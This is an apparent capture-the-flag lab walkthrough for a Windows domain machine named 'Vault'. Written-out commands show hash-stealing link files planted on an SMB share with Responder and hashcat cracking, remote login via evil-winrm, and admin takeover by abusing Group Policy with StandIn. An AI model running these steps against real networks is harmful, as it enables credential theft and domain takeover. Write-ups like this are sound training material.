# Vault

### Enumeration

```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds
```

```
$ smbmap -u Guest -H 192.168.200.172
DocumentsShare                                          READ, WRITE
```

We will try client side attack: Malicious link to get ntlm hash

Setting up responder:

```
# cd /usr/share/responder
# python3 Responder.py -I tun0
```

Generating links:

```
$ git clone https://github.com/xct/hashgrab
$ cd hashgrab
$ python3 hashgrab.py 192.168.49.200 test
```

Uploading links:

```
smb: \> put @test.lnk 
putting file @test.lnk as \test.lnk (2.2 kb/s) (average 2.2 kb/s)
smb: \> put @test.scf
putting file @test.scf as \@test.scf (0.2 kb/s) (average 1.5 kb/s)
smb: \> put @test.url
putting file @test.url as \@test.url (0.3 kb/s) (average 1.2 kb/s)
```

In responder, we can see 9 NTLMv2 hashes -> hashes.txt

```
$ hashcat -m 5600 -w 4 -a 0 hashes.txt ~/Desktop/rockyou.txt --force
ANIRUDH:[REDACTED]
```

Expired Password -> change with:

```
$ rdesktop -u anirudh -p [REDACTED] 192.168.200.172
```

The user is not in RDP Group.

### Initial Access

```
$ evil-winrm -u anirudh -p password -i 192.168.200.172
```

### PrivEsc

3 ways for PrivEsc.

SeRestorePrivilege - SeRestoreAbuse.exe - https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe

SeBackupPrivilege - Getting SYSTEM, SAM, SECURITY files -> Extract administrator hash -Z use it with evil-winrm

GPO

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#find-vulnerable-gpo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#find-vulnerable-gpo)

[https://github.com/FuzzySecurity/StandIn/releases\
\
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#abuse-gpo-with-standin](https://github.com/FuzzySecurity/StandIn/releaseshttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#abuse-gpo-with-standin)

```
*Evil-WinRM* PS C:\Users\anirudh\Desktop> .\StandIn_v13_Net45.exe --gpo
[?] Object   : CN={6AC1786C-016F-11D2-945F-00C04fB984F9}
    Path     : LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
    DisplayName              : Default Domain Controllers Policy
    CN                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
    GPCFilesysPath           : \\vault.offsec\sysvol\vault.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
    GPCMachineExtensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
    WhenCreated              : 11/19/2021 8:50:33 AM
    WhenChanged              : 11/19/2021 8:50:33 AM

[?] Object   : CN={31B2F340-016D-11D2-945F-00C04FB984F9}
    Path     : LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
    DisplayName              : Default Domain Policy
    CN                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
    GPCFilesysPath           : \\vault.offsec\sysvol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
    GPCMachineExtensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
    WhenCreated              : 11/19/2021 8:50:33 AM
    WhenChanged              : 11/19/2021 9:00:32 AM

*Evil-WinRM* PS C:\Users\anirudh\Desktop> .\StandIn_v13_Net45.exe --gpo --filter "Default Domain Policy" --acl
[+] Account       : VAULT\anirudh
    Type          : Allow
    Rights        : FullControl
    Inherited ACE : False
    Propagation   : None
    
*Evil-WinRM* PS C:\Users\anirudh\Desktop> .\StandIn_v13_Net45.exe --gpo --filter "Default Domain Policy" --localadmin anirudh
*Evil-WinRM* PS C:\Users\anirudh\Desktop> gpupdate /force
```

Login again.
